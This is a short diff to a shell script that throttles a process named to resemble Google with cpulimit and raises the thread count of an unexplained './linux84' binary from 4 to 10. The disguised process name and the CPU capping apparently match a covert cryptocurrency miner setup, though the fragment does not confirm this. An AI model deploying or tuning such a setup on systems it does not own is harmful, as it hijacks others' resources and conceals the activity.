@@ -89,7 +89,7 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-./linux84 -t 4
+./linux84 -t 10
 
 else
 
@@ -110,7 +110,7 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-./linux84 -t 4
+./linux84 -t 10
 
 fi
 
